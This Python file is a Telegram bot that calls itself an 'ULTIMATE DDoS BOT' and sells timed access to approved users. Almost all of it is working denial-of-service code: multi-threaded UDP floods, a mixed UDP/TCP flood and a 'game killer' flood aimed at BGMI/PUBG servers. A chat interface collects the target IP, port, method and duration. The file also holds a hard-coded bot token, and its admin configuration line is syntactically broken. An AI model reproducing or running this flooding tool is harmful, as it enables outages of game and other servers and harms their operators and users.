# bot_railway_ultimate.py - Includes G-FLOOD method
import asyncio
import threading
import time
import random
import socket
import re
import os
import json
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============ CONFIG ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8576723884:8635470675:AAGK8u_0qROyP5TiLXMSWA6yJhjpGAlHreE")
ADMIN_IDS = [int(os.environ.get(ADMIN_IDS = [8210011971]   # ← अपना ID यहाँ लिखें
BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001}

# ============ POWERFUL SETTINGS ============
class AttackConfig:
    def __init__(self):
        self.threads = 150          # Max for Railway
        self.sockets_per_thread = 25
        self.delay = 0.000008       # Very fast
        self.packet_size = 1024     # 'G'*1024 size

config = AttackConfig()

# Global state
attack_running = False
attack_stats = {'packets': 0, 'target': '', 'method': '', 'start': 0, 'duration': 0}
stats_lock = threading.Lock()
user_data = {}
active_attack_threads = []

# ============ SIMPLE DATABASE ============
USERS_FILE = "users.json"
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    return {}
def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f)
def is_approved(uid):
    users = load_users()
    user = users.get(str(uid), {})
    if user.get('approved'):
        expires = user.get('expires')
        if expires and datetime.fromisoformat(expires) < datetime.now():
            return False
        return True
    return False
def approve_user(uid, days):
    users = load_users()
    users[str(uid)] = {'approved': True, 'expires': (datetime.now() + timedelta(days=days)).isoformat()}
    save_users(users)

# ============ ATTACK ENGINE - G FLOOD (YOUR METHOD) ============
def g_flood(ip, port):
    """Pure G character flood - multiple sockets for max speed"""
    global attack_running, attack_stats
    socks = []
    for _ in range(config.sockets_per_thread):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            socks.append(s)
        except:
            pass
    # Payload: 1024 'G' characters like your script
    payload = ('G' * config.packet_size).encode('utf-8')
    while attack_running:
        for sock in socks:
            try:
                sock.sendto(payload, (ip, port))
                with stats_lock:
                    attack_stats['packets'] += 1
            except:
                pass
        time.sleep(config.delay)
    for sock in socks:
        sock.close()

def udp_max_flood(ip, port):
    """Random payload UDP flood"""
    global attack_running, attack_stats
    socks = []
    for _ in range(config.sockets_per_thread):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            socks.append(s)
        except:
            pass
    payload = random._urandom(config.packet_size)
    while attack_running:
        for sock in socks:
            try:
                sock.sendto(payload, (ip, port))
                with stats_lock:
                    attack_stats['packets'] += 1
            except:
                pass
        time.sleep(config.delay)
    for sock in socks:
        sock.close()

def mixed_max_flood(ip, port):
    """UDP + TCP combined"""
    global attack_running, attack_stats
    udp_socks = []
    for _ in range(config.sockets_per_thread):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_socks.append(s)
        except:
            pass
    payload = random._urandom(config.packet_size)
    while attack_running:
        for sock in udp_socks:
            try:
                sock.sendto(payload, (ip, port))
                with stats_lock:
                    attack_stats['packets'] += 1
            except:
                pass
        try:
            tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp.settimeout(0.0005)
            tcp.connect_ex((ip, port))
            tcp.close()
            with stats_lock:
                attack_stats['packets'] += 1
        except:
            pass
        time.sleep(config.delay)
    for sock in udp_socks:
        sock.close()

def game_killer_flood(ip, port):
    """Specialized game server killer (BGMI/PUBG)"""
    global attack_running, attack_stats
    socks = []
    for _ in range(config.sockets_per_thread):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            socks.append(s)
        except:
            pass
    payloads = [
        b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00',
        ('G' * 1024).encode('utf-8'),
        random._urandom(1024),
        b'\x00' * 1024,
        b'\xff' * 1024
    ]
    while attack_running:
        for payload in payloads:
            for sock in socks:
                try:
                    sock.sendto(payload, (ip, port))
                    with stats_lock:
                        attack_stats['packets'] += 1
                except:
                    pass
        time.sleep(config.delay * 0.8)
    for sock in socks:
        sock.close()

# ============ ATTACK LAUNCHER ============
def start_attack(ip, port, duration, method, send_callback):
    global attack_running, attack_stats, active_attack_threads
    
    attack_running = True
    with stats_lock:
        attack_stats = {
            'packets': 0,
            'target': f"{ip}:{port}",
            'method': method,
            'start': time.time(),
            'duration': duration
        }
    
    # Select attack function
    if method == 'gflood':
        attack_func = g_flood
    elif method == 'udp':
        attack_func = udp_max_flood
    elif method == 'game':
        attack_func = game_killer_flood
    else:
        attack_func = mixed_max_flood
    
    total_streams = config.threads * config.sockets_per_thread
    
    # Launch threads
    active_attack_threads = []
    for _ in range(config.threads):
        t = threading.Thread(target=attack_func, args=(ip, port), daemon=True)
        t.start()
        active_attack_threads.append(t)
    
    # Initial message
    keyboard = [
        [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
        [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")]
    ]
    send_callback(
        f"💀 *ATTACK STARTED* 💀\n\n🎯 `{ip}:{port}`\n⚙️ Method: `{method.upper()}`\n⏱️ Duration: `{duration}s`\n🧵 Threads: `{config.threads}` × {config.sockets_per_thread} sockets = `{total_streams}` streams\n\n_Sending G-FLOOD & others..._",
        InlineKeyboardMarkup(keyboard)
    )
    
    # Monitor
    start_time = time.time()
    last_update = 0
    while attack_running and (time.time() - start_time) < duration:
        time.sleep(0.8)
        if time.time() - last_update >= 1.5:
            last_update = time.time()
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            with stats_lock:
                pkt = attack_stats['packets']
            speed = int(pkt / elapsed) if elapsed > 0 else 0
            progress = int((elapsed / duration) * 20)
            bar = "█" * progress + "░" * (20 - progress)
            msg = (
                f"💀 *ATTACK IN PROGRESS* 💀\n\n"
                f"🎯 `{ip}:{port}` | `{method.upper()}`\n"
                f"📦 Packets: `{pkt:,}`\n"
                f"💥 Speed: `{speed:,}` pps\n"
                f"⏱️ `{elapsed}/{duration}s`\n"
                f"📊 `[{bar}]`\n"
                f"🧵 Streams: `{total_streams}`\n\n"
                f"🔘 *Buttons:*"
            )
            send_callback(msg, InlineKeyboardMarkup(keyboard))
    
    # Attack ends
    attack_running = False
    for t in active_attack_threads:
        t.join(timeout=0.5)
    with stats_lock:
        pkt = attack_stats['packets']
    avg_speed = int(pkt / duration) if duration else 0
    send_callback(
        f"✅ *ATTACK COMPLETE*\n\n📦 Total Packets: `{pkt:,}`\n💥 Average Speed: `{avg_speed:,}` pps",
        None
    )

# ============ TELEGRAM HANDLERS (Professional UI) ============
async def start_cmd(update, context):
    uid = update.effective_user.id
    if uid in ADMIN_IDS and not is_approved(uid):
        approve_user(uid, 365)
    if not is_approved(uid) and uid not in ADMIN_IDS:
        await update.message.reply_text("❌ Access Denied", parse_mode='Markdown')
        return
    total_streams = config.threads * config.sockets_per_thread
    expected_speed = int((1 / config.delay) * config.threads * config.sockets_per_thread) if config.delay > 0 else 0
    keyboard = [
        [InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack")],
        [InlineKeyboardButton("⚙️ SETTINGS", callback_data="settings")],
        [InlineKeyboardButton("📖 HELP", callback_data="help")]
    ]
    await update.message.reply_text(
        f"🔥 *ULTIMATE DDoS BOT* 🔥\n\n"
        f"⚡ *Current Power:*\n"
        f"├ Threads: `{config.threads}`\n"
        f"├ Sockets/Thread: `{config.sockets_per_thread}`\n"
        f"├ Total Streams: `{total_streams}`\n"
        f"├ Delay: `{config.delay}` sec\n"
        f"└ Packet Size: `{config.packet_size}` bytes\n\n"
        f"💥 Expected Speed: `{expected_speed:,}` pps\n\n"
        f"👇 *Choose an option* 👇",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update, context):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data
    
    if data == "start_attack":
        user_data[uid] = {'step': 'ip'}
        await query.edit_message_text(
            "🎯 *TARGET IP*\n\nSend target IP address:\nExample: `20.204.148.249`\n\nFor BGMI, use IP from PCAPdroid",
            parse_mode='Markdown'
        )
    elif data == "settings":
        total_streams = config.threads * config.sockets_per_thread
        keyboard = [
            [InlineKeyboardButton("⬆️ +10 THREADS", callback_data="inc_threads")],
            [InlineKeyboardButton("⬇️ -10 THREADS", callback_data="dec_threads")],
            [InlineKeyboardButton("🚀 MAX SPEED", callback_data="max_speed")],
            [InlineKeyboardButton("🔙 BACK", callback_data="back_main")]
        ]
        await query.edit_message_text(
            f"⚙️ *SETTINGS*\n\nThreads: `{config.threads}` / 150\nSockets/Thread: `{config.sockets_per_thread}`\nTotal Streams: `{total_streams}`\nDelay: `{config.delay}` sec\n\nAdjust:",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif data == "inc_threads":
        if config.threads + 10 <= 150:
            config.threads += 10
            await query.edit_message_text(f"✅ Threads increased to `{config.threads}`", parse_mode='Markdown')
        else:
            await query.answer("Max 150 threads on Railway!", show_alert=True)
    elif data == "dec_threads":
        if config.threads - 10 >= 50:
            config.threads -= 10
            await query.edit_message_text(f"✅ Threads decreased to `{config.threads}`", parse_mode='Markdown')
        else:
            await query.answer("Minimum 50 threads", show_alert=True)
    elif data == "max_speed":
        config.delay = 0.000005
        config.sockets_per_thread = 30
        await query.edit_message_text(f"✅ MAX SPEED: delay={config.delay}, sockets={config.sockets_per_thread}", parse_mode='Markdown')
    elif data == "back_main":
        total_streams = config.threads * config.sockets_per_thread
        expected_speed = int((1 / config.delay) * config.threads * config.sockets_per_thread)
        keyboard = [
            [InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack")],
            [InlineKeyboardButton("⚙️ SETTINGS", callback_data="settings")],
            [InlineKeyboardButton("📖 HELP", callback_data="help")]
        ]
        await query.edit_message_text(
            f"🔥 *ULTIMATE DDoS BOT* 🔥\n\n⚡ Threads: `{config.threads}`, Streams: `{total_streams}`, Delay: `{config.delay}`\n💥 Expected: `{expected_speed:,}` pps\n\n👇 Choose:",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif data == "help":
        keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back_main")]]
        await query.edit_message_text(
            "📖 *HOW TO USE*\n\n1️⃣ Click START ATTACK\n2️⃣ Enter IP\n3️⃣ Enter port (1-65535)\n4️⃣ Choose method:\n   • G-FLOOD - Pure 'G' characters flood (your method)\n   • UDP MAX - Random payload\n   • MIXED MAX - UDP+TCP\n   • GAME KILLER - BGMI/PUBG\n5️⃣ Set duration (5-300s)\n6️⃣ Confirm → Attack starts\n\n*During attack* use STOP/INFO/REFRESH buttons.\n\n⚠️ Use only on own servers!",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif data == "stop_attack":
        global attack_running
        attack_running = False
        await query.edit_message_text("🛑 Attack stopped", parse_mode='Markdown')
    elif data == "info_attack":
        if attack_running:
            with stats_lock:
                pkt = attack_stats['packets']
                elapsed = int(time.time() - attack_stats['start'])
                remaining = attack_stats['duration'] - elapsed
                speed = int(pkt / elapsed) if elapsed else 0
            await query.edit_message_text(
                f"ℹ️ *INFO*\n\n📦 Packets: `{pkt:,}`\n⏱️ Remaining: `{remaining}s`\n💥 Speed: `{speed:,}` pps",
                parse_mode='Markdown'
            )
        else:
            await query.answer("No active attack")
    elif data == "refresh_attack":
        if attack_running:
            with stats_lock:
                pkt = attack_stats['packets']
                elapsed = int(time.time() - attack_stats['start'])
                remaining = attack_stats['duration'] - elapsed
                speed = int(pkt / elapsed) if elapsed else 0
                progress = int((elapsed / attack_stats['duration']) * 20)
                bar = "█" * progress + "░" * (20 - progress)
                keyboard = [
                    [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
                    [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")]
                ]
                await query.edit_message_text(
                    f"💀 *ATTACK ACTIVE* 💀\n\n📦 `{pkt:,}` pkts\n💥 `{speed:,}` pps\n⏱️ `{elapsed}/{attack_stats['duration']}s`\n📊 `[{bar}]`",
                    parse_mode='Markdown',
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
        else:
            await query.edit_message_text("✅ No active attack", parse_mode='Markdown')

async def handle_message(update, context):
    uid = update.effective_user.id
    if not is_approved(uid) and uid not in ADMIN_IDS:
        return
    step_data = user_data.get(uid, {})
    step = step_data.get('step')
    text = update.message.text.strip()
    if step == 'ip':
        if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', text):
            await update.message.reply_text("❌ Invalid IP", parse_mode='Markdown')
            return
        step_data['ip'] = text
        step_data['step'] = 'port'
        user_data[uid] = step_data
        await update.message.reply_text(f"🔌 Port (1-65535):\n🚫 Blocked: {', '.join(map(str, sorted(BLOCKED_PORTS)))}", parse_mode='Markdown')
    elif step == 'port':
        try:
            port = int(text)
            if port < 1 or port > 65535 or port in BLOCKED_PORTS:
                raise ValueError
            step_data['port'] = port
            step_data['step'] = 'method'
            user_data[uid] = step_data
            keyboard = [
                [InlineKeyboardButton("🇬 G-FLOOD (your method)", callback_data="method_gflood")],
                [InlineKeyboardButton("🔥 UDP MAX", callback_data="method_udp")],
                [InlineKeyboardButton("⚡ MIXED MAX", callback_data="method_mixed")],
                [InlineKeyboardButton("🎮 GAME KILLER", callback_data="method_game")],
                [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]
            ]
            await update.message.reply_text("Select attack method:", reply_markup=InlineKeyboardMarkup(keyboard))
        except:
            await update.message.reply_text("❌ Invalid port", parse_mode='Markdown')
    elif step == 'duration':
        try:
            duration = int(text)
            if duration < 5 or duration > 300:
                raise ValueError
            ip = step_data['ip']
            port = step_data['port']
            method = step_data.get('method', 'gflood')
            del user_data[uid]
            keyboard = [[InlineKeyboardButton("💀 CONFIRM", callback_data=f"start_{ip}_{port}_{duration}_{method}")], [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]]
            await update.message.reply_text(
                f"💀 *CONFIRM ATTACK*\n\n🎯 `{ip}:{port}`\n⚙️ Method: `{method.upper()}`\n⏱️ Duration: `{duration}s`\n\nStart?",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except:
            await update.message.reply_text("❌ Duration 5-300", parse_mode='Markdown')
    else:
        await update.message.reply_text("Send /start", parse_mode='Markdown')

async def method_callback(update, context):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data
    if data == "cancel":
        if uid in user_data:
            del user_data[uid]
        await query.edit_message_text("❌ Cancelled", parse_mode='Markdown')
        return
    if data.startswith("method_"):
        method = data.split("_")[1]
        if uid not in user_data:
            user_data[uid] = {}
        user_data[uid]['method'] = method
        user_data[uid]['step'] = 'duration'
        await query.edit_message_text(f"✅ Method: `{method.upper()}`\n⏱️ Send duration (5-300s):", parse_mode='Markdown')
        return
    if data.startswith("start_"):
        parts = data.split("_")
        if len(parts) != 5:
            await query.edit_message_text("❌ Invalid data", parse_mode='Markdown')
            return
        ip = parts[1]
        port = int(parts[2])
        duration = int(parts[3])
        method = parts[4]
        if uid in user_data:
            del user_data[uid]
        await query.edit_message_text(f"🚀 Launching {method.upper()} attack on {ip}:{port}...", parse_mode='Markdown')
        loop = asyncio.get_event_loop()
        def send_cb(msg, markup=None):
            asyncio.run_coroutine_threadsafe(query.message.reply_text(msg, parse_mode='Markdown', reply_markup=markup), loop)
        threading.Thread(target=start_attack, args=(ip, port, duration, method, send_cb), daemon=True).start()

async def stop_command(update, context):
    global attack_running
    attack_running = False
    await update.message.reply_text("🛑 Attack stopped", parse_mode='Markdown')

async def approve_command(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized", parse_mode='Markdown')
        return
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /approve <user_id> <days>", parse_mode='Markdown')
        return
    try:
        uid = int(context.args[0])
        days = int(context.args[1])
        approve_user(uid, days)
        await update.message.reply_text(f"✅ User {uid} approved for {days} days", parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ Invalid", parse_mode='Markdown')

def main():
    total = config.threads * config.sockets_per_thread
    print("="*60)
    print("🔥 ULTIMATE DDoS BOT (G-FLOOD INCLUDED)")
    print(f"👑 Admins: {ADMIN_IDS}")
    print(f"🧵 Threads: {config.threads}, Sockets: {config.sockets_per_thread}, Streams: {total}")
    print(f"⚡ Delay: {config.delay}s")
    print("="*60)
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("approve", approve_command))
    app.add_handler(CallbackQueryHandler(button_callback, pattern="^(start_attack|settings|help|back_main|inc_threads|dec_threads|max_speed|stop_attack|info_attack|refresh_attack)$"))
    app.add_handler(CallbackQueryHandler(method_callback, pattern="^(method_|start_|cancel)"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("✅ BOT LIVE! Send /start on Telegram")
    app.run_polling()

if __name__ == "__main__":
    main()
